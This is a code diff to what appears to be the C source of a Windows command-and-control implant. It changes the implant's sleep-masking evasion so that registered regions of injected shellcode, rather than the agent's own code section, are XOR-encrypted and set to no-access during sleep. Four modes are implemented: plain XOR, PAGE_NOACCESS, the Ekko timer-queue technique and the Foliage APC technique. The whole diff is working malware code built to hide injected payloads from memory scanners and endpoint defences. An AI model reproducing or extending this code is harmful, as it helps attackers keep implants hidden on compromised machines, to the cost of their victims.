@@ -52,8 +52,16 @@ typedef LONG  (NTAPI *NtTestAlert_t)(void);
 
 /* ── Globals in .data/.bss — always accessible even when .text is locked ─ */
 static NtDelay_t g_NtDelay = NULL;
-static void     *g_text    = NULL;   /* base of .text section */
-static SIZE_T    g_tsz     = 0;      /* size of .text section */
+static void     *g_text    = NULL;   /* base of .text section (kept for reference) */
+static SIZE_T    g_tsz     = 0;      /* size of .text section (kept for reference) */
+
+/* External shellcode regions registered for sleep masking.
+ * Sleep masking only touches these — NEVER the agent's own .text.
+ * (VirtualProtect on own .text triggers Windows debug traps after N cycles.) */
+#define MAX_EVASION_REGIONS 8
+typedef struct { void *base; SIZE_T sz; } EvasionRegion;
+static EvasionRegion g_ev_regions[MAX_EVASION_REGIONS];
+static int           g_ev_count = 0;
 
 #if AGENT_SLEEP_MASK_MODE >= 1
 static VProt_t   g_VProt   = NULL;
@@ -67,7 +75,12 @@ static CreateTimerQueue_t      g_CreateTimerQueue      = NULL;
 static CreateTimerQueueTimer_t g_CreateTimerQueueTimer = NULL;
 static DeleteTimerQueueEx_t    g_DeleteTimerQueueEx    = NULL;
 static WaitForSingleObject_t   g_WaitForSingleObject   = NULL;
-typedef struct { void *text; SIZE_T text_sz; HANDLE event; volatile LONG encrypted; } EkkoCtx;
+typedef struct {
+    EvasionRegion *regions;
+    int            region_count;
+    HANDLE         event;
+    volatile LONG  encrypted;
+} EkkoCtx;
 static EkkoCtx g_ekko_ctx;
 #endif
 
@@ -80,7 +93,13 @@ static NtCreateThreadEx_t    g_NtCreateThreadEx   = NULL;
 static NtQueueApcThread_t    g_NtQueueApcThread   = NULL;
 static NtAlertResumeThread_t g_NtAlertResumeThread = NULL;
 static NtTestAlert_t         g_NtTestAlert        = NULL;
-typedef struct { void *text; SIZE_T text_sz; HANDLE event; DWORD ms; volatile LONG encrypted; } FoliageCtx;
+typedef struct {
+    EvasionRegion *regions;
+    int            region_count;
+    HANDLE         event;
+    DWORD          ms;
+    volatile LONG  encrypted;
+} FoliageCtx;
 static FoliageCtx g_foliage_ctx;
 #endif
 
@@ -90,6 +109,16 @@ static volatile LONG g_conn_thread_count = 0;
 
 void evasion_conn_enter(void) { InterlockedIncrement(&g_conn_thread_count); }
 void evasion_conn_leave(void) { InterlockedDecrement(&g_conn_thread_count); }
+
+/* Register an external shellcode region for sleep masking.
+ * Call after injecting shellcode into a remote section/allocation. */
+void evasion_register_region(void *base, SIZE_T sz) {
+    if (g_ev_count < MAX_EVASION_REGIONS && base && sz) {
+        g_ev_regions[g_ev_count].base = base;
+        g_ev_regions[g_ev_count].sz   = sz;
+        g_ev_count++;
+    }
+}
 
 /* ── Startup helpers (run from .text before any sleep masking) ─────────── */
 
@@ -563,27 +592,29 @@ static void plain_sleep(DWORD ms) {
 /* ─────────────────────────── MODE 1: XOR only ─────────────────────────── */
 #if AGENT_SLEEP_MASK_MODE == 1
 
+/* XOR all registered external regions (encrypt before sleep, decrypt after).
+ * Only compiled in mode 1 — the only mode that uses this helper. */
+__attribute__((section(".evasn"), noinline))
+static void xor_ev_regions(void) {
+    for (int i = 0; i < g_ev_count; i++) {
+        unsigned char *p = (unsigned char*)g_ev_regions[i].base;
+        SIZE_T sz = g_ev_regions[i].sz;
+        if (!p || !sz || !g_VProt) continue;
+        DWORD old;
+        if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old))
+            if (!g_VProt(p, sz, PAGE_READWRITE, &old)) continue;
+        for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
+        g_VProt(p, sz, old, &old);   /* restore original protection */
+    }
+}
+
 __attribute__((section(".evasn"), noinline))
 void sleep_masked(DWORD ms) {
-    if (!g_text || !g_VProt || !g_NtDelay) { plain_sleep(ms); return; }
-
-    unsigned char *text = (unsigned char*)g_text;
-    SIZE_T sz = g_tsz;
-    DWORD old;
-
-    /* Make .text writable; bail if blocked (HVCI) */
-    if (!g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old)) { plain_sleep(ms); return; }
-    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
-    g_VProt(text, sz, PAGE_EXECUTE_READ, &old);   /* readable but garbled */
-
+    /* XOR-encrypt external regions before sleep, decrypt after.
+     * If no regions registered, this is a plain NtDelayExecution sleep. */
+    xor_ev_regions();
     plain_sleep(ms);
-
-    /* Restore writable before decrypt XOR; fallback to PAGE_READWRITE if
-     * EXECUTE+WRITE is blocked — writing to PAGE_EXECUTE_READ would fault. */
-    if (!g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old))
-        if (!g_VProt(text, sz, PAGE_READWRITE, &old)) return;
-    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
-    g_VProt(text, sz, PAGE_EXECUTE_READ, &old);
+    xor_ev_regions();
 }
 
 /* ──────────────────────── MODE 2: PAGE_NOACCESS ───────────────────────── */
@@ -591,24 +622,35 @@ void sleep_masked(DWORD ms) {
 
 __attribute__((section(".evasn"), noinline))
 void sleep_masked(DWORD ms) {
-    if (!g_text || !g_VProt || !g_NtDelay) { plain_sleep(ms); return; }
-    /* Skip while pipe-server threads execute in .text */
     if (InterlockedOr(&g_conn_thread_count, 0) > 0) { plain_sleep(ms); return; }
 
-    unsigned char *text = (unsigned char*)g_text;
-    SIZE_T sz = g_tsz;
-    DWORD old;
-
-    if (!g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old)) { plain_sleep(ms); return; }
-    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
-    g_VProt(text, sz, PAGE_NOACCESS, &old);
+    /* XOR + NOACCESS external registered regions; save original protections */
+    DWORD saved_prots[MAX_EVASION_REGIONS];
+    for (int i = 0; i < g_ev_count; i++) {
+        unsigned char *p = (unsigned char*)g_ev_regions[i].base;
+        SIZE_T sz = g_ev_regions[i].sz;
+        saved_prots[i] = PAGE_EXECUTE_READ;
+        if (!p || !sz || !g_VProt) continue;
+        DWORD old;
+        if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old)) continue;
+        saved_prots[i] = old;
+        for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
+        g_VProt(p, sz, PAGE_NOACCESS, &old);
+    }
 
     plain_sleep(ms);
 
-    if (!g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old))
-        if (!g_VProt(text, sz, PAGE_READWRITE, &old)) return;
-    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
-    g_VProt(text, sz, PAGE_EXECUTE_READ, &old);
+    /* Restore external regions */
+    for (int i = 0; i < g_ev_count; i++) {
+        unsigned char *p = (unsigned char*)g_ev_regions[i].base;
+        SIZE_T sz = g_ev_regions[i].sz;
+        if (!p || !sz || !g_VProt) continue;
+        DWORD old;
+        if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old))
+            g_VProt(p, sz, PAGE_READWRITE, &old);
+        for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
+        g_VProt(p, sz, saved_prots[i], &old);
+    }
 }
 
 /* ─────────────────────────── MODE 3: EKKO ─────────────────────────────── */
@@ -618,11 +660,15 @@ __attribute__((section(".evasn"), noinline))
 static VOID CALLBACK ekko_encrypt_cb(PVOID ctx, BOOLEAN unused) {
     (void)unused;
     EkkoCtx *c = (EkkoCtx*)ctx;
-    unsigned char *t = (unsigned char*)c->text;
-    DWORD old;
-    if (!g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old)) return;
-    for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
-    g_VProt(t, c->text_sz, PAGE_NOACCESS, &old);
+    for (int i = 0; i < c->region_count; i++) {
+        unsigned char *p = (unsigned char*)c->regions[i].base;
+        SIZE_T sz = c->regions[i].sz;
+        if (!p || !sz) continue;
+        DWORD old;
+        if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old)) continue;
+        for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
+        g_VProt(p, sz, PAGE_NOACCESS, &old);
+    }
     InterlockedExchange(&c->encrypted, 1);
 }
 
@@ -630,34 +676,42 @@ __attribute__((section(".evasn"), noinline))
 static VOID CALLBACK ekko_decrypt_cb(PVOID ctx, BOOLEAN unused) {
     (void)unused;
     EkkoCtx *c = (EkkoCtx*)ctx;
-    unsigned char *t = (unsigned char*)c->text;
-    DWORD old;
-    if (!g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old))
-        g_VProt(t, c->text_sz, PAGE_READWRITE, &old);
-    for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
-    g_VProt(t, c->text_sz, PAGE_EXECUTE_READ, &old);
+    for (int i = 0; i < c->region_count; i++) {
+        unsigned char *p = (unsigned char*)c->regions[i].base;
+        SIZE_T sz = c->regions[i].sz;
+        if (!p || !sz) continue;
+        DWORD old;
+        if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old))
+            g_VProt(p, sz, PAGE_READWRITE, &old);
+        for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
+        g_VProt(p, sz, PAGE_EXECUTE_READ, &old);
+    }
     InterlockedExchange(&c->encrypted, 0);
     g_SetEvent(c->event);
 }
 
 __attribute__((section(".evasn"), noinline))
 void sleep_masked(DWORD ms) {
-    if (!g_text || !g_VProt || !g_NtDelay || !g_CreateEvent || !g_SetEvent ||
-        !g_CloseHandle || !g_CreateTimerQueue || !g_CreateTimerQueueTimer ||
+    if (!g_NtDelay || !g_CreateEvent || !g_SetEvent || !g_CloseHandle ||
+        !g_CreateTimerQueue || !g_CreateTimerQueueTimer ||
         !g_DeleteTimerQueueEx || !g_WaitForSingleObject)
         { plain_sleep(ms); return; }
 
     if (InterlockedOr(&g_conn_thread_count, 0) > 0) { plain_sleep(ms); return; }
 
-    /* Probe VirtualProtect (HVCI check) */
-    DWORD probe;
-    if (!g_VProt(g_text, g_tsz, PAGE_EXECUTE_READWRITE, &probe)) { plain_sleep(ms); return; }
-    g_VProt(g_text, g_tsz, PAGE_EXECUTE_READ, &probe);
+    /* If no external regions registered, use a simple alertable sleep
+     * (main thread parks in ntdll — clean call stack — without touching .text) */
+    if (g_ev_count == 0) {
+        LARGE_INTEGER t;
+        t.QuadPart = -(LONGLONG)ms * 10000LL;
+        g_NtDelay(TRUE, &t);   /* alertable = TRUE: clean stack, no .text touch */
+        return;
+    }
 
-    g_ekko_ctx.text      = g_text;
-    g_ekko_ctx.text_sz   = g_tsz;
-    g_ekko_ctx.encrypted = 0;
-    g_ekko_ctx.event     = g_CreateEvent(NULL, FALSE, FALSE, NULL);
+    g_ekko_ctx.regions      = g_ev_regions;
+    g_ekko_ctx.region_count = g_ev_count;
+    g_ekko_ctx.encrypted    = 0;
+    g_ekko_ctx.event        = g_CreateEvent(NULL, FALSE, FALSE, NULL);
     if (!g_ekko_ctx.event) { plain_sleep(ms); return; }
 
     HANDLE hQ = g_CreateTimerQueue();
@@ -670,20 +724,20 @@ void sleep_masked(DWORD ms) {
                             &g_ekko_ctx, ms, 0, WT_EXECUTEINTIMERTHREAD);
 
     DWORD wait_rc = g_WaitForSingleObject(g_ekko_ctx.event, ms + 10000);
-
     g_DeleteTimerQueueEx(hQ, (HANDLE)(LONG_PTR)(-1));
 
-    /* Emergency recovery: if the decrypt callback didn't fire (timer thread
-     * crash, system overload, etc.), .text is still NOACCESS+garbled.
-     * Restore it here — if we return with .text inaccessible the CPU will
-     * fault executing WinMain (the return address on our stack). */
+    /* Emergency recovery if decrypt callback didn't fire */
     if (wait_rc != WAIT_OBJECT_0 && InterlockedOr(&g_ekko_ctx.encrypted, 0)) {
-        DWORD old;
-        unsigned char *t2 = (unsigned char*)g_ekko_ctx.text;
-        if (!g_VProt(t2, g_ekko_ctx.text_sz, PAGE_EXECUTE_READWRITE, &old))
-            g_VProt(t2, g_ekko_ctx.text_sz, PAGE_READWRITE, &old);
-        for (SIZE_T i = 0; i < g_ekko_ctx.text_sz; i++) t2[i] ^= 0xA7;
-        g_VProt(t2, g_ekko_ctx.text_sz, PAGE_EXECUTE_READ, &old);
+        for (int i = 0; i < g_ekko_ctx.region_count; i++) {
+            unsigned char *p = (unsigned char*)g_ekko_ctx.regions[i].base;
+            SIZE_T sz = g_ekko_ctx.regions[i].sz;
+            if (!p || !sz) continue;
+            DWORD old;
+            if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old))
+                g_VProt(p, sz, PAGE_READWRITE, &old);
+            for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
+            g_VProt(p, sz, PAGE_EXECUTE_READ, &old);
+        }
     }
 
     g_CloseHandle(g_ekko_ctx.event);
@@ -693,18 +747,19 @@ void sleep_masked(DWORD ms) {
 /* ─────────────────────────── MODE 4: FOLIAGE ──────────────────────────── */
 #elif AGENT_SLEEP_MASK_MODE == 4
 
-/* All three APC routines and the thread entry live in .evasn so they are
- * reachable while .text is PAGE_NOACCESS. */
-
 __attribute__((section(".evasn"), noinline))
 static VOID NTAPI foliage_encrypt_apc(PVOID ctx, PVOID a2, PVOID a3) {
     (void)a2; (void)a3;
     FoliageCtx *c = (FoliageCtx*)ctx;
-    unsigned char *t = (unsigned char*)c->text;
-    DWORD old;
-    if (!g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old)) return;
-    for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
-    g_VProt(t, c->text_sz, PAGE_NOACCESS, &old);
+    for (int i = 0; i < c->region_count; i++) {
+        unsigned char *p = (unsigned char*)c->regions[i].base;
+        SIZE_T sz = c->regions[i].sz;
+        if (!p || !sz) continue;
+        DWORD old;
+        if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old)) continue;
+        for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
+        g_VProt(p, sz, PAGE_NOACCESS, &old);
+    }
     InterlockedExchange(&c->encrypted, 1);
 }
 
@@ -721,81 +776,82 @@ __attribute__((section(".evasn"), noinline))
 static VOID NTAPI foliage_decrypt_apc(PVOID ctx, PVOID a2, PVOID a3) {
     (void)a2; (void)a3;
     FoliageCtx *c = (FoliageCtx*)ctx;
-    unsigned char *t = (unsigned char*)c->text;
-    DWORD old;
-    if (!g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old))
-        g_VProt(t, c->text_sz, PAGE_READWRITE, &old);
-    for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
-    g_VProt(t, c->text_sz, PAGE_EXECUTE_READ, &old);
+    for (int i = 0; i < c->region_count; i++) {
+        unsigned char *p = (unsigned char*)c->regions[i].base;
+        SIZE_T sz = c->regions[i].sz;
+        if (!p || !sz) continue;
+        DWORD old;
+        if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old))
+            g_VProt(p, sz, PAGE_READWRITE, &old);
+        for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
+        g_VProt(p, sz, PAGE_EXECUTE_READ, &old);
+    }
     InterlockedExchange(&c->encrypted, 0);
     g_SetEvent(c->event);
 }
 
-/* Thread entry: drain the APC queue then exit. Lives in .evasn. */
 __attribute__((section(".evasn"), noinline))
 static DWORD WINAPI foliage_thread_entry(PVOID arg) {
     (void)arg;
-    g_NtTestAlert();   /* process all queued APCs (encrypt→sleep→decrypt) */
+    g_NtTestAlert();   /* drain APC queue (encrypt→sleep→decrypt) */
     return 0;
 }
 
 __attribute__((section(".evasn"), noinline))
 void sleep_masked(DWORD ms) {
-    if (!g_text || !g_VProt || !g_NtDelay || !g_CreateEvent || !g_SetEvent ||
-        !g_CloseHandle || !g_WaitForSingleObject || !g_NtCreateThreadEx ||
+    if (!g_NtDelay || !g_CreateEvent || !g_SetEvent || !g_CloseHandle ||
+        !g_WaitForSingleObject || !g_NtCreateThreadEx ||
         !g_NtQueueApcThread || !g_NtAlertResumeThread || !g_NtTestAlert)
         { plain_sleep(ms); return; }
 
     if (InterlockedOr(&g_conn_thread_count, 0) > 0) { plain_sleep(ms); return; }
 
-    DWORD probe;
-    if (!g_VProt(g_text, g_tsz, PAGE_EXECUTE_READWRITE, &probe)) { plain_sleep(ms); return; }
-    g_VProt(g_text, g_tsz, PAGE_EXECUTE_READ, &probe);
+    /* No external regions: park main thread alertably in ntdll (clean stack) */
+    if (g_ev_count == 0) {
+        LARGE_INTEGER t;
+        t.QuadPart = -(LONGLONG)ms * 10000LL;
+        g_NtDelay(TRUE, &t);
+        return;
+    }
 
-    g_foliage_ctx.text      = g_text;
-    g_foliage_ctx.text_sz   = g_tsz;
-    g_foliage_ctx.ms        = ms;
-    g_foliage_ctx.encrypted = 0;
-    g_foliage_ctx.event     = g_CreateEvent(NULL, FALSE, FALSE, NULL);
+    g_foliage_ctx.regions      = g_ev_regions;
+    g_foliage_ctx.region_count = g_ev_count;
+    g_foliage_ctx.ms           = ms;
+    g_foliage_ctx.encrypted    = 0;
+    g_foliage_ctx.event        = g_CreateEvent(NULL, FALSE, FALSE, NULL);
     if (!g_foliage_ctx.event) { plain_sleep(ms); return; }
 
-    /* Create thread suspended; it will drain the APC queue on alert-resume */
     HANDLE hThread = NULL;
     LONG status = g_NtCreateThreadEx(
-        &hThread,
-        0x1FFFFF,               /* THREAD_ALL_ACCESS */
-        NULL,
-        (HANDLE)(LONG_PTR)(-1), /* NtCurrentProcess() */
-        foliage_thread_entry,
-        NULL,
-        0x1,                    /* CREATE_SUSPENDED */
-        0, 0, 0, NULL);
+        &hThread, 0x1FFFFF, NULL,
+        (HANDLE)(LONG_PTR)(-1),
+        foliage_thread_entry, NULL,
+        0x1, 0, 0, 0, NULL);
     if (status != 0 || !hThread) {
         g_CloseHandle(g_foliage_ctx.event);
         plain_sleep(ms);
         return;
     }
 
-    /* Queue APCs: encrypt → sleep → decrypt (FIFO order) */
     g_NtQueueApcThread(hThread, foliage_encrypt_apc, &g_foliage_ctx, NULL, NULL);
     g_NtQueueApcThread(hThread, foliage_sleep_apc,   &g_foliage_ctx, NULL, NULL);
     g_NtQueueApcThread(hThread, foliage_decrypt_apc, &g_foliage_ctx, NULL, NULL);
-
-    /* Alert-resume: thread wakes and processes its APC queue */
     g_NtAlertResumeThread(hThread, NULL);
 
-    /* Park main thread in ntdll until decrypt APC fires SetEvent */
     DWORD wait_rc = g_WaitForSingleObject(g_foliage_ctx.event, ms + 15000);
-
     g_CloseHandle(hThread);
 
     if (wait_rc != WAIT_OBJECT_0 && InterlockedOr(&g_foliage_ctx.encrypted, 0)) {
-        DWORD old;
-        unsigned char *t2 = (unsigned char*)g_foliage_ctx.text;
-        if (!g_VProt(t2, g_foliage_ctx.text_sz, PAGE_EXECUTE_READWRITE, &old))
-            g_VProt(t2, g_foliage_ctx.text_sz, PAGE_READWRITE, &old);
-        for (SIZE_T i = 0; i < g_foliage_ctx.text_sz; i++) t2[i] ^= 0xA7;
-        g_VProt(t2, g_foliage_ctx.text_sz, PAGE_EXECUTE_READ, &old);
+        for (int i = 0; i < g_foliage_ctx.region_count; i++) {
+            unsigned char *p = (unsigned char*)g_foliage_ctx.regions[i].base;
+            SIZE_T sz = g_foliage_ctx.regions[i].sz;
+            if (!p || !sz) continue;
+            DWORD old;
+            if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old))
+                g_VProt(p, sz, PAGE_READWRITE, &old);
+            for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
+            g_VProt(p, sz, PAGE_EXECUTE_READ, &old);
+        }
     }
 
     g_CloseHandle(g_foliage_ctx.event);
